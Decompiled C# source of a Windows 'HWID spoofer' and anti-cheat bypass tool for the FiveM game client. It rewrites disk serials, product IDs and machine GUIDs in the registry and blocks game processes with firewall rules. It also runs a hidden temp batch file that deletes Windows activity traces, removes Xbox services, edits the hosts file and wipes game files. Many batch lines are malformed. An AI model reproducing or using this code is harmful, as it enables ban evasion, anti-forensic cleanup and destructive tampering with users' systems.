
// Type: Loader.UserControl2
// Assembly: Thunder Spoofer, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 6911BFCC-B15C-4BF6-865B-4753D2D18ED6
// Assembly location: C:\Users\ADIKIBERNITIKOS\Desktop\111\1_.exe

using Guna.UI2.WinForms;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Media;
using System.Net;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading;
using System.Timers;
using System.Windows.Forms;

namespace Loader
{
  public class UserControl2 : UserControl
  {
    private string m_c = "XB0L9";
    public static Random random;
    private IContainer components;
    private Label label1;
    private Label label6;
    private Guna2PictureBox guna2PictureBox1;
    private Guna2Button guna2Button8;
    private Guna2Button guna2Button7;
    private Guna2Button guna2Button5;
    private Guna2Button guna2Button2;
    private Guna2Button guna2Button1;
    private System.Windows.Forms.Timer timer1;
    private Guna2Button guna2Button3;

    public UserControl2() => this.InitializeComponent();

    private void UserControl2_Load(object sender, EventArgs e) => this.guna2Button3.Hide();

    public static void Diskclick()
    {
      foreach (string subKeyName1 in Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi").GetSubKeyNames())
      {
        foreach (string subKeyName2 in Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi\\" + subKeyName1).GetSubKeyNames())
        {
          RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi\\" + subKeyName1 + "\\" + subKeyName2 + "\\Target Id 0\\Logical Unit Id 0", true);
          if (registryKey != null && registryKey.GetValue("DeviceType").ToString() == "DiskPeripheral")
          {
            string s1 = "XB0L95MV9YE3IR";
            string s2 = "XB0L95MV9YE3IR";
            registryKey.SetValue("DeviceIdentifierPage", (object) Encoding.UTF8.GetBytes(s2));
            registryKey.SetValue("Identifier", (object) s1);
            registryKey.SetValue("InquiryData", (object) Encoding.UTF8.GetBytes(s1));
            registryKey.SetValue("SerialNumber", (object) s2);
          }
        }
      }
    }

    public static void XBOXclick()
    {
      string str = "40438d3e";
      RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", true).SetValue("InstallDate", (object) str);
    }

    public void xynwbyzia()
    {
      string tempPath = Path.GetTempPath();
      if (Process.GetProcessesByName(this.m_c + ".bat").Length == 0)
      {
        System.IO.File.Delete(tempPath + this.m_c + ".bat");
      }
      else
      {
        Thread.Sleep(5000);
        this.xynwbyzia();
      }
    }

    public static void IDclick()
    {
      string str = "EBB39-DAA7F-ABA35-FE4BE";
      RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", true);
      registryKey.SetValue("ProductID", (object) str);
      registryKey.Close();
    }

    public static void PCclick()
    {
      RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ActiveComputerName", true);
      registryKey.SetValue("ComputerName", (object) "DESKTOP-2129BA");
      registryKey.Close();
    }

    public static void NetWoof()
    {
      List<Process> processList = new List<Process>();
      string path1 = "C:\\Program Files\\Win64";
      if (!Directory.Exists(path1))
        Directory.CreateDirectory(path1);
      if (System.IO.File.Exists("C:\\Program Files\\Win64\\net.bat"))
      {
        Process.Start("C:\\Program Files\\Win64\\net.bat");
        System.IO.File.Delete("C:\\Program Files\\Win64\\net.bat");
      }
      else
      {
        string path2 = "C:\\Program Files\\Win64\\net.bat";
        using (StreamWriter text = System.IO.File.CreateText(path2))
          text.WriteLine("netsh int ip reset");
        Process process = new Process();
        process.StartInfo.FileName = path2;
        processList.Add(process);
        System.IO.File.SetAttributes("C:\\Program Files\\Win64\\net.bat", FileAttributes.Hidden);
        process.Start();
        Thread.Sleep(500);
        System.IO.File.Delete("C:\\Program Files\\Win64\\net.bat");
      }
    }

    public static void InstallDate()
    {
      string str = "1187b19b";
      RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", true).SetValue(nameof (InstallDate), (object) str);
    }

    public static string CurrentProductID()
    {
      string name1 = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion";
      string name2 = "ProductID";
      return ((RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey(name1) ?? throw new KeyNotFoundException("Key Not Found: " + name1)).GetValue(name2) ?? throw new IndexOutOfRangeException("Index Not Found: " + name2)).ToString();
    }

    public static void Disk()
    {
      foreach (string subKeyName1 in Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi").GetSubKeyNames())
      {
        foreach (string subKeyName2 in Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi\\" + subKeyName1).GetSubKeyNames())
        {
          RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi\\" + subKeyName1 + "\\" + subKeyName2 + "\\Target Id 0\\Logical Unit Id 0", true);
          if (registryKey != null && registryKey.GetValue("DeviceType").ToString() == "DiskPeripheral")
          {
            string s1 = "XB0L95MV9YE3IR";
            string s2 = "XB0L95MV9YE3IR";
            registryKey.SetValue("DeviceIdentifierPage", (object) Encoding.UTF8.GetBytes(s2));
            registryKey.SetValue("Identifier", (object) s1);
            registryKey.SetValue("InquiryData", (object) Encoding.UTF8.GetBytes(s1));
            registryKey.SetValue("SerialNumber", (object) s2);
          }
        }
      }
      foreach (string subKeyName in Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\MultifunctionAdapter\\0\\DiskController\\0\\DiskPeripheral").GetSubKeyNames())
        Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\MultifunctionAdapter\\0\\DiskController\\0\\DiskPeripheral\\" + subKeyName, true).SetValue("Identifier", (object) "XB0L95MV-XB0L95MV-A");
    }

    public static void FiveM()
    {
      string folderPath1 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
      string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
      if (Directory.Exists(folderPath1 + "\\DigitalEntitlements"))
        Directory.Delete(folderPath1 + "\\DigitalEntitlements", true);
      if (Directory.Exists(folderPath1 + "\\FiveM\\FiveM.app\\crashes"))
        Directory.Delete(folderPath1 + "\\FiveM\\FiveM.app\\crashes", true);
      if (Directory.Exists(folderPath1 + "\\FiveM\\FiveM.app\\logs"))
        Directory.Delete(folderPath1 + "\\FiveM\\FiveM.app\\logs", true);
      if (Directory.Exists(folderPath1 + "\\FiveM\\FiveM.app\\data\\cache"))
        Directory.Delete(folderPath1 + "\\FiveM\\FiveM.app\\data\\cache", true);
      Directory.Exists(folderPath1 + "\\FiveM\\FiveM.app\\data\\server-cache");
      if (!Directory.Exists(folderPath2 + "\\CitizenFX"))
        return;
      Directory.Delete(folderPath2 + "\\CitizenFX", true);
    }

    public static void MyMethod2(object sender, ElapsedEventArgs e)
    {
      if (Process.GetProcessesByName("FiveM").Length == 0)
        return;
      Thread.Sleep(1000);
      new Process()
      {
        StartInfo = {
          FileName = "cmd.exe",
          CreateNoWindow = true,
          RedirectStandardInput = true,
          RedirectStandardOutput = true,
          UseShellExecute = false,
          Verb = "runas",
          Arguments = "/C netsh advfirewall firewall add rule name = \"FiveM2372Block\" dir =in action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\fivem_b2372_gtaprocess.exe\" > nul && netsh advfirewall firewall set rule name = \"FiveM2372Block\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2372Block\" dir =out new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveMSteamBlock\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveMSteamBlock\" dir =out new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveMRockstarBlock\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveMRockstarBlock\" dir =out new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2189Block\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2189Block\" dir =out new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2060Block\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2060Block\" dir =out new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2545Block\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2545Block\" dir =out new enable= no > nul"
        }
      }.Start();
      Application.Exit();
    }

    private void guna2Button9_Click(object sender, EventArgs e)
    {
      Thread.Sleep(2500);
      this.xynwbyzia();
      int num = (int) MessageBox.Show("Unlinked All Services!", "Legion Woofer Premium", MessageBoxButtons.OK);
    }

    public static void Enable_LocalAreaConection(string adapterId, bool enable = true)
    {
      string str1 = "Ethernet";
      foreach (NetworkInterface networkInterface in NetworkInterface.GetAllNetworkInterfaces())
      {
        if (networkInterface.Id == adapterId)
        {
          str1 = networkInterface.Name;
          break;
        }
      }
      string str2 = enable ? nameof (enable) : "disable";
      ProcessStartInfo processStartInfo = new ProcessStartInfo("netsh", "interface set interface \"" + str1 + "\" " + str2);
      Process process = new Process();
      process.StartInfo = processStartInfo;
      process.Start();
      process.StartInfo.CreateNoWindow = true;
      process.WaitForExit();
    }

    private void guna2Button1_Click(object sender, EventArgs e)
    {
      if (Process.GetProcessesByName("FiveM").Length != 0)
      {
        foreach (Process process in Process.GetProcessesByName("FiveM"))
          process.Kill();
      }
      new Process()
      {
        StartInfo = {
          FileName = "cmd.exe",
          CreateNoWindow = true,
          RedirectStandardInput = true,
          RedirectStandardOutput = true,
          UseShellExecute = false,
          Verb = "runas",
          Arguments = "/C netsh advfirewall firewall add rule name = \"FiveM2372Block\" dir =in action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\fivem_b2372_gtaprocess.exe\" > nul && netsh advfirewall firewall add rule name = \"FiveM2372Block\" dir =out action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\fivem_b2372_gtaprocess.exe\" > nul && netsh advfirewall firewall set rule name = \"FiveM2372Block\" dir =in new enable= yes > nul && netsh advfirewall firewall set rule name = \"FiveM2372Block\" dir =out new enable= yes > nul && netsh advfirewall firewall add rule name = \"FiveMSteamBlock\" dir =in action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\FiveM_SteamChild.exe\" > nul && netsh advfirewall firewall add rule name = \"FiveMSteamBlock\" dir =out action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\FiveM_SteamChild.exe\" > nul && netsh advfirewall firewall set rule name = \"FiveMSteamBlock\" dir =in new enable= yes > nul && netsh advfirewall firewall set rule name = \"FiveMSteamBlock\" dir =out new enable= yes > nul && netsh advfirewall firewall add rule name = \"FiveMRockstarBlock\" dir =in action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\FiveM_GTAProcess.exe\" > nul && netsh advfirewall firewall add rule name = \"FiveMRockstarBlock\" dir =out action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\FiveM_GTAProcess.exe\" > nul && netsh advfirewall firewall set rule name = \"FiveMRockstarBlock\" dir =in new enable= yes > nul && netsh advfirewall firewall set rule name = \"FiveMRockstarBlock\" dir =out new enable= yes > nul && netsh advfirewall firewall add rule name = \"FiveM2189Block\" dir =in action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\FiveM_b2189_GTAProcess.exe\" > nul && netsh advfirewall firewall add rule name = \"FiveM2189Block\" dir =out action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\FiveM_b2189_GTAProcess.exe\" > nul && netsh advfirewall firewall set rule name = \"FiveM2189Block\" dir =in new enable= yes > nul && netsh advfirewall firewall set rule name = \"FiveM2189Block\" dir =out new enable= yes > nul && netsh advfirewall firewall add rule name = \"FiveM2060Block\" dir =in action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\fivem_b2060_gtaprocess.exe\" > nul && netsh advfirewall firewall add rule name = \"FiveM2060Block\" dir =out action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\fivem_b2060_gtaprocess.exe\" > nul && netsh advfirewall firewall set rule name = \"FiveM2060Block\" dir =in new enable= yes > nul && netsh advfirewall firewall set rule name = \"FiveM2060Block\" dir =out new enable= yes > nul && netsh advfirewall firewall add rule name = \"FiveM2545Block\" dir =in action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\fivem_b2545_gtaprocess.exe\" > nul && netsh advfirewall firewall add rule name = \"FiveM2545Block\" dir =out action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\fivem_b2545_gtaprocess.exe\" > nul && netsh advfirewall firewall add rule name = \"FiveM2545Block\" dir =out action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\fivem_b2545_gtaprocess.exe\" > nul && netsh advfirewall firewall set rule name = \"FiveM2545Block\" dir =in new enable= yes > nul && netsh advfirewall firewall set rule name = \"FiveM2545Block\" dir =out new enable= yes > nul"
        }
      }.Start();
      int num = (int) MessageBox.Show("FiveM Bypassed Enabled", "Legion Spoofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
      this.guna2Button3.Show();
    }

    public static void HWIDclick()
    {
      string keyName = "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\IDConfigDB\\Hardware Profiles\\0001";
      string str1 = (string) Registry.GetValue(keyName, "HwProfileGuid", (object) "default");
      string str2 = "{ImpulseOnTop-72597-62482-4194-844193755}";
      Registry.SetValue(keyName, "GUID", (object) str2);
      Registry.SetValue(keyName, "HwProfileGuid", (object) str2);
    }

    private void guna2Button2_Click(object sender, EventArgs e)
    {
      new d().b();
      if (System.IO.File.Exists("C:\\Windows\\System32\\nvml.dll"))
      {
        try
        {
          System.IO.File.Move("C:\\Windows\\System32\\nvml.dll", "C:\\Windows\\System32\\nvml2.dll");
          System.IO.File.Move("C:\\Windows\\System32\\nvmld.dll", "C:\\Windows\\System32\\nvmld2.dll");
        }
        catch
        {
        }
      }
      int num = (int) MessageBox.Show("Cleaned Nvidia Logger!", "Legion Woofer Premium", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
    }

    private void guna2Button8_Click(object sender, EventArgs e)
    {
      try
      {
        if (System.IO.File.Exists("C:\\Program Files\\Win64\\net.bat"))
        {
          System.IO.File.Move("C:\\Windows\\System32\\nvml.dll", "C:\\Windows\\System32\\nvml2.dll");
          System.IO.File.Move("C:\\Windows\\System32\\nvmld.dll", "C:\\Windows\\System32\\nvmld2.dll");
        }
        if (Directory.Exists("C:\\Program Files (x86)\\Blade Group"))
        {
          Directory.Delete("C:\\Program Files (x86)\\Blade Group");
          Directory.CreateDirectory("C:\\Program Files (x86)\\Blade Group");
        }
        new d().b();
      }
      catch
      {
      }
      string str = Path.ChangeExtension(Path.GetTempFileName(), ".bat");
      using (StreamWriter streamWriter = new StreamWriter(str))
      {
        streamWriter.WriteLine("echo off");
        streamWriter.WriteLine("taskkill / f / im Steam.exe / t");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("rmdir / s / q % LocalAppData%\\DigitalEntitlements");
        streamWriter.WriteLine("taskkill / f / im Steam.exe / t");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("rmdir / s / q % userprofile %\\AppData\\Roaming\\CitizenFX");
        streamWriter.WriteLine("taskkill / f / im Steam.exe / t");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("set hostspath =% windir %\\System32\\drivers\\etc\\hosts");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("echo 127.0.0.1 xboxlive.com >> % hostspath %");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("echo 127.0.0.1 user.auth.xboxlive.com >> % hostspath %");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("echo 127.0.0.1 presence - heartbeat.xboxlive.com >> % hostspath %");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\MSLicensing\\HardwareID / f");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\MSLicensing\\Store / f");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("DELETE HKEY_CURRENT_USER\\Software\\WinRAR\\ArcHistory / f");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings\\S - 1 - 5 - 21 - 1282084573 - 1681065996 - 3115981261 - 1001 / va / f");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("REG DELETEH KEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\ShowJumpView / f");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("REG DELETEH KEY_CURRENT_USER\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\WinRAR\\ArcHistory / f");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched / f");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("REG DELETE HKEY_CLASSES_ROOT\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\ShowJumpView / f");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings\\S - 1 - 5 - 21 - 332004695 - 2829936588 - 140372829 - 1002 / f");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("REG DELETE HKEY_CLASSES_ROOT\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Compatibility Assistant\\Store / f");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched / f");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings\\S - 1 - 5 - 21 - 1282084573 - 1681065996 - 3115981261 - 1001 / f");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched / f");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_chrome.bin");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game.bin");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_372.bin");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_1604.bin");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_1868.bin");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_2060.bin");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_2189.bin");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\botan.dll");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\asi - five.dll");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\steam.dll");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\steam_api64.dll");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenGame.dll");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\profiles.dll");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cfx_curl_x86_64.dll");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX.ini");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\caches.XML");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\adhesive.dll");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("taskkill / f / im Steam.exe / t");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\discord.dll");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("RENAME % userprofile %\\AppData\\Roaming\\discord\\0.0.309\\modules\\discord_rpc STARCHARMS_SPOOFER");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\Browser");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\db");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\dunno");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\priv");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\servers");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\subprocess");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\unconfirmed");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\authbrowser");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cache\\crashometry");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cache\\launcher_skip");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cache\\launcher_skip_mtl2");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\crashes\\*.* ");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\logs\\*.* ");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\mods\\*.* ");
        streamWriter.WriteLine(":folderclean");
        streamWriter.WriteLine("call :getDiscordVersion");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("goto :xboxclean");
        streamWriter.WriteLine(": getDiscordVersion");
        streamWriter.WriteLine("for / d %% a in (' % appdata%\\Discord\\*') do (");
        streamWriter.WriteLine("     set 'varLoc =%%a'");
        streamWriter.WriteLine("   goto :d1");
        streamWriter.WriteLine(")");
        streamWriter.WriteLine(":d1");
        streamWriter.WriteLine("for / f 'delims =\\ tokens=7' %% z in ('echo %varLoc%') do (");
        streamWriter.WriteLine("     set 'discordVersion =%%z'");
        streamWriter.WriteLine(")");
        streamWriter.WriteLine("goto :EOF");
        streamWriter.WriteLine(": xboxclean");
        streamWriter.WriteLine(" cls");
        streamWriter.WriteLine("powershell - Command ' & {Get-AppxPackage -AllUsers xbox | Remove-AppxPackage}'");
        streamWriter.WriteLine("sc stop XblAuthManager");
        streamWriter.WriteLine("sc stop XblGameSave");
        streamWriter.WriteLine("sc stop XboxNetApiSvc");
        streamWriter.WriteLine("sc stop XboxGipSvc");
        streamWriter.WriteLine("sc delete XblAuthManager");
        streamWriter.WriteLine("sc delete XblGameSave");
        streamWriter.WriteLine("sc delete XboxNetApiSvc");
        streamWriter.WriteLine("sc delete XboxGipSvc");
        streamWriter.WriteLine("reg delete 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\xbgm' / f");
        streamWriter.WriteLine("schtasks / Change / TN 'Microsoft\\XblGameSave\\XblGameSaveTask' / disable");
        streamWriter.WriteLine("schtasks / Change / TN 'Microsoft\\XblGameSave\\XblGameSaveTaskLogon' / disableL");
        streamWriter.WriteLine("reg add 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\GameDVR' / v AllowGameDVR / t REG_DWORD / d 0 / f");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("set hostspath =% windir %\\System32\\drivers\\etc\\hosts");
        streamWriter.WriteLine("   echo 127.0.0.1 xboxlive.com >> % hostspath %");
        streamWriter.WriteLine("   echo 127.0.0.1 user.auth.xboxlive.com >> % hostspath % ");
        streamWriter.WriteLine("   echo 127.0.0.1 presence - heartbeat.xboxlive.com >> % hostspath %");
        streamWriter.WriteLine("   rd % userprofile %\\AppData\\Local\\DigitalEntitlements / q / s");
        streamWriter.WriteLine("exit");
        streamWriter.WriteLine("goto :eof");
      }
      Process.Start(str).WaitForExit();
      System.IO.File.Delete(str);
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", "Append Completion", (object) "yes", RegistryValueKind.String);
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", "AutoSuggest", (object) "yes", RegistryValueKind.String);
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer", "EnableAutoTray", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Remote Assistance", "fAllowToGetHelp", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "DisallowShaking", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CLASSES_ROOT\\AllFilesystemObjects\\shellex\\ContextMenuHandlers\\Copy To", "", (object) "{C2FBB630-2971-11D1-A18C-00C04FD75D13}");
      Registry.SetValue("HKEY_CLASSES_ROOT\\AllFilesystemObjects\\shellex\\ContextMenuHandlers\\Move To", "", (object) "{C2FBB631-2971-11D1-A18C-00C04FD75D13}");
      Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "AutoEndTasks", (object) "1");
      Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "HungAppTimeout", (object) "1000");
      Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "MenuShowDelay", (object) "0");
      Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "WaitToKillAppTimeout", (object) "2000");
      Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "LowLevelHooksTimeout", (object) "1000");
      Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Mouse", "MouseHoverTime", (object) "0");
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoLowDiskSpaceChecks", (object) "00000001", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "LinkResolveIgnoreLinkInfo", (object) "00000001", RegistryValueKind.DWord);
